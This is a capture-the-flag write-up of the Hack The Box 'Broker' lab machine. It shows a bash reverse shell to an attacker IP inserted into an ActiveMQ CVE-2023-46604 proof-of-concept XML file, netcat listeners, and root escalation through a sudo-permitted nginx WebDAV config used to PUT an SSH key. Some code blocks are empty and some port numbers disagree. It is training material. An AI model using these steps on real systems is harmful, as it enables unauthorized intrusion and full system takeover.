# Broker.

### Difficulty: Easy

## OS: Linux

### Introduction:

So the first machine and write-up that’s going to be published for the OUCSS GitHub and [website](https://oucss.rocks) so I may get it good.

Hey - I’m m0j0r1s1n and I’m going to walk you through how I attack this “easy” machine from the HTB guided series.
I will be using a mix between my trusted Ubuntu Hacktop and a newly created Debian VM on a Windows 11 OS with VMware. Also some brainpower, art and a bit of fun will hopefully I get **root**!!
So what am I waiting for here goes. Hope you enjoy (:

### Enumeration and Methodology.

I start with [rustscan](https://github.com/RustScan/RustScan) for speed and then I will dive deeper with [nmap](https://nmap.org/) if needed. I am given an IP of  10.10.11.243 to start.

```bash
m0j0@r1s1n: ~/HTB/writeups/broker m0j0_development ⚡
$ rustscan 10.10.11.243 --ulimit 5000                                                                                                      [19:18:01]

Rustscan has thrown up a lot of ports to dig into. I will run my nmap scan, one that I used always before rustscan was released. The flags used for my nmap scan get a good description from ChatGPT which should be in your toolbox if it isn’t by now.

1.

- **sV: Service Version Detection**
- This flag enables service version detection during the scan. It attempts to determine the version of the services running on open ports.

2.

- **sC: Default Script Scan**
- This flag enables the default set of scripts for the most common enumeration and vulnerability checks. It's a convenient way to run a set of scripts without specifying each one individually.

3.

- **p-: Scan All 65535 Ports**
- This flag instructs Nmap to scan all 65,535 ports on the target. It's used when you want to check for open ports on a wide range.

This won’t always be the case but for most cases on HTB it works.

The difference between Rustscan and Nmap is startling:

```bash
m0j0@r1s1n: ~/HTB/writeups/broker m0j0_development ⚡
$ nmap -sC -sV 10.10.11.243                                                                                                                [19:18:34]

```

For now I will focus on port 80 and keep the rustscan output in my head for later. Also the realm `ActiveMQRealm` this points to some Apache service possibly Active MQ?

So I visit the IP and I am presented with a pop up login alert??

Being an easy machine I thought to try default credentials but I didn’t know what, so I tried one from the top of my head - `admin:admin`  and it works (:

![Untitled](Broker%2018e0dac30adc4561a45d0723f3afb8c3/Untitled.png)

After inputting `admin:admin` I am presented with:

![Untitled](Broker%2018e0dac30adc4561a45d0723f3afb8c3/Untitled%201.png)

It goes to an Active MQ service, so what is this?

```
What is ActiveMQ (Active Message Queuing)? ActiveMQ is an open source protocol developed by Apache which functions as an implementation of message-oriented middleware (MOM). Its basic function is to send messages between different applications, but includes additional features like STOMP, JMS, and OpenWire.
```

I have a name/service to look for possible vulnerabilities now, but in the background I will fuzz for directories and sub-domains as this is part of the methodology I use and it is ingrained in me and should be in you.  

**Don’t miss** basic enumeration as this page I have found could simply be a rabbit hole with all the other open ports - remember the rustscan output! That output will answer the first question for guided mode:

“Which open TCP port is running the ActiveMQ service?”

My output and Google help here.

The next question:

“What is the version of the ActiveMQ service running on the box?”

It can be answered by navigating the website.

And the 3rd:

What is the 2023 CVE-ID for a remote code execution vulnerability in the ActiveMQ version running on Broker?

Well this is guided and I got enough hints to find it using `intitle: keywords`

**Fuzzing Results**:

I use [ffuf](https://github.com/ffuf/ffuf) mostly but sometimes check the results against [gobuster](https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwjl4u_FpJeDAxXPAewKHS8rApQQFnoECBkQAQ&url=https%3A%2F%2Fgithub.com%2FOJ%2Fgobuster&usg=AOvVaw1DiZiA8_QAKoZfGLpGpHFj&opi=89978449) as I have stumbled upon bugs when one doesn’t pick a domain up or misses directories which can be painful and time lost. Also I use ffuf for speed - the difference is visible. I have an example that shows ffuf **not** picking a directory up but my [nikto](https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwjEodCgqJeDAxXeXEEAHT2cC_kQFnoECBwQAQ&url=https%3A%2F%2Fgithub.com%2Fsullo%2Fnikto&usg=AOvVaw3-hiAEprTx1n-qofxH5GSg&opi=89978449) scan in the background.

One solution or reason this can happen for me anyway is I don’t have the domain in my `etc/hosts`file. 

Gobuster/ffuf both can like an domain name to resolve too. I have stumbled on a possible domain in my nmap scan - `ActiveMQRealm` it’s just not got `htb` on the end. 

I like to find the FQDN during my enumeration stage on the site and I haven’t so I will move on with what I have got so far.

I have a service it’s version and Google.  This instantly throws up recent CVE’s some wrote in Golang and some in Python.  I tried the Golang CVE but got presented with an error I can’t resolve so took a look at the Python CVE found [here](https://github.com/evkl1d/CVE-2023-46604).  I had to edit this file to make it work. Here I edit the `poc.xml`file by adding my IP address to the reverse shell code.

```xml
<constructor-arg>
            <list>
                <value>bash</value>
                <value>-c</value>
                <value>bash -i &gt;&amp; /dev/tcp/10.10.14.19/1234 0&gt;&amp;1</value>
            </list>
            </constructor-arg>
```

Then I need to set up a listener for my shell and a server for the `poc.xml` and finally run the code.

### Server:

```bash
m0j0@r1s1n: ~/HTB/writeups/broker/CVE-2023-46604 main
$ python3 -m http.server                                        [6:52:55]
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.243 - - [18/Dec/2023 06:58:53] "GET /poc.xml HTTP/1.1" 200 -
```

You can see it is serving in the directory that the `poc.xml` file is. It serves the file when I run the exploit.

### Listener:

```bash
m0j0@r1s1n: ~/HTB/writeups/broker/ActiveMQ-RCE
$ rlwrap nc -nvlp 1234                                                                                                                      [6:04:00]
Listening on 0.0.0.0 1234
```

I use [rlwrap](https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwiPu8uYuZiDAxUDVEEAHYg-DTYQFnoECBkQAQ&url=https%3A%2F%2Fgithub.com%2Fhanslub42%2Frlwrap&usg=AOvVaw33k-F4z9B_Wt8qyEJ7sats&opi=89978449) as it helps with the shell and my input.

### Exploit for Shell:

```bash

```

It looks like the exploit has went with no errors, time to check for my shell:

```bash

Boom I got a reverse shell as the user **activemq** and this answers the next question:

- “What user is the ActiveMQ service running as on Broker?”
- This is easy to tell.

Also the next question:

- “Submit the flag located in the activemq user's home directory.”
- Well that’s easy.

So what happened when I got the shell, let me backtrack.

First, I upgrade the shell for stability with a trusted script command:

`script /dev/null -c bash`

In this case it was python3, always check the python version. 

After this I proceed with commands to give me a better shell.

 

```

ctrl+z # in the terminal backgrounds it.

stty raw -echo # used for display settings of the terminal

fg # bring the terminal back into the forground.
```

Once in the shell as the user **activemq** I can get `user.txt` and keep answering the guided questions.

# Privilege Escalation to root:

One of the first things I will do before putting [linpeas](https://github.com/carlospolop/PEASS-ng/releases/tag/20231217-4a3b3f9d) or other scripts such as [lse.sh](https://github.com/diego-treitos/linux-smart-enumeration/blob/master/lse.sh) and [pspy64](https://github.com/DominicBreuker/pspy) on the machine, I run `sudo -l` looking to see if I can run a process as root.

```bash
activemq@broker:/tmp$ id
id
uid=1000(activemq) gid=1000(activemq) groups=1000(activemq)
activemq@broker:/tmp$ sudo -l
sudo -l
Matching Defaults entries for activemq on broker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User activemq may run the following commands on broker:
    (ALL : ALL) NOPASSWD: /usr/sbin/nginx
```

What do you know I can. I can see that the user **activemq** can basically use the [nginx](https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwj4qtaeh5mDAxU_xQIHHZelAigQFnoECAYQAQ&url=https%3A%2F%2Fwww.nginx.com%2F&usg=AOvVaw10RW2cXcmCuZ2YnsYWHFKR&opi=89978449) web server.

Now I need to see is it possible to use it and escalate to **root**.

I can run Nginx as root with no password, which has to be the way.. By using a writeable folder such as `/dev/shm/`  to download an already made nginx configuration file I constructed using the nginx configuration from the official site [here](https://www.nginx.com/resources/wiki/start/topics/examples/full/). 

I will abuse the methods we saw get used by the **dav_methods**.  One in particular I like is PUT.
My thinking is create the conf file to have a user of root and to set a new port it will listen on:

```bash
user root;
events {
    worker_connections 1024;
}
http {
    server {
        listen 9002;
        root /;
        autoindex on;
	dav_methods PUT;
    }
}
```

Above is what I use. I declare the PUT method in the hope I can place my public ssh key.
I need to build a curl command.  After a few attempts and a clean-up process wiping my conf file I finally got it and was able to SSH in as root and grab the `root.txt`. Below are my steps: 

I checked for a writeable folder:

```bash
activemq@broker:/opt/apache-activemq-5.15.15/bin$ find / -perm -222 -type d 2>/dev/null
<-5.15.15/bin$ find / -perm -222 -type d 2>/dev/null
/run/screen
/run/lock
/var/tmp
/var/crash
/tmp
/tmp/.font-unix
/tmp/.XIM-unix
/tmp/.Test-unix
/tmp/.ICE-unix
/tmp/.X11-unix
/dev/mqueue
/dev/shm
```

There I have `/dev/shm.` Jumping into that directory I get ready to download the conf file I create.

This is the nginx configuration file created:

```bash
┌[m0j0☮r1s1n]-(~)
└> cat ~/HTB/writeups/broker/m0j0.conf 
user root;
events {
    worker_connections 1024;
}
http {
    server {
        listen 9002;
        root /;
        autoindex on;
	dav_methods PUT;
    }
}
```

It is pretty self explanatory what’s going on - my root user and the port and method all declared.

Using a python server I download using wget in my shell.

```bash
activemq@broker:/dev/shm$ wget http://10.10.14.12:8000/m0j0.conf
```

Then try and beat a clean-up script running and use the sudo command to set a custom nginx configuration by specifying a file:

```bash
activemq@broker:/dev/shm$ sudo usr/sbin/nginx -c /dev/shm/m0j0.conf
```

If that went with no errors I grab my public SSH key and use curl to try and PUT it in roots authorized keys:

```bash
activemq@broker:/dev/shm$ curl -X PUT localhost:1339/root/.ssh/authorized_keys -d 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPq5u+E+vdpz0gJimDNmx+Jg4Fi/ElQTu2xcx9nLgXIk m0j0@r1s1n'

Look above. Look at the errors I encountered as you can too. That was the clean-up and my file was wiped so I had to download quick again and try another time.  By this stage I have these command wrote on a text-editor for speed.

I try for root with SSH and it work (:

```bash
┌[m0j0☮r1s1n]-(~/HTB/writeups/broker)

Looking back I found this box to be a solid Easy that tested my enumeration skills and Linux skills.
I ran into several pitfalls and errors on this box that I know it reinforced some basic skills for me which is a big plus.

**Note**:

I managed to answer all the Guided mode questions when I got root. Guided is certainly a fun way to play and you are guaranteed to get root. If not you will be close, so using the official walkthrough or another posted online is not a crime.  Learn from it and take it in.
All tools for this machine I used are pre installed on Kali.  I use a Debian VM to teach me more skills as I find problems all the time when installing tools.  This forces me to learn how to fix them, it is enjoyable to me but Kali is the easier option by far.
